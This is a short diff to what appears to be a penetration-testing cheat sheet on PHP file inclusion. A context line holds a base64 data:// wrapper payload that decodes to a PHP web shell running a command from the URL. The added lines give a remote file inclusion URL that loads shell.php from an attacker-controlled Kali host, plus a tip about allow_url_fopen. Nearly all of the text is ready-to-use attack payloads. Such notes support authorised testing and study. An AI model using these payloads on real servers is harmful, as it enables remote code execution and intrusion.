@@ -127,6 +127,12 @@ data wrapper
 	http://URL/vulnerable.php?page=data://test/plain,base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=whoami"
 base64 encoded data wrapper  
 
+### RFI
+	http://url.com/index.php?file=http://kali-ip/shell.php
+On a php webserver with URL parameter  
+
+If `phpinfo()` is visible, check if `allow_url_fopen` is on.  
+
 ### LFI/PHP wrappers
 	http://url.com/index.php?file=
 On a php webserver with a valid URL parameter,  
